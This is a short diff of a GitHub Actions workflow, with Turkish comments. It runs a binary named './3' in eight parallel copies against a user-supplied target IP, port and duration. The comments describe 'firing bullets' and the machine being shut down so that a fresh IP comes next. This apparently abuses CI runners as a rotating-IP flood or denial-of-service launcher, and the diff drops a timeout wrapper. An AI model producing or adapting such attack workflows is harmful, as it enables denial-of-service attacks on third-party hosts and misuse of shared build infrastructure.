@@ -33,7 +33,7 @@ jobs:
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..8}; do
-             sudo timeout 60 ./3 ${{ inputs.ip }} ${{ inputs.port }} 500 1000 ${{ inputs.time }} &
+             ./3 ${{ inputs.ip }} ${{ inputs.port }} 500 1000 ${{ inputs.time }} &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
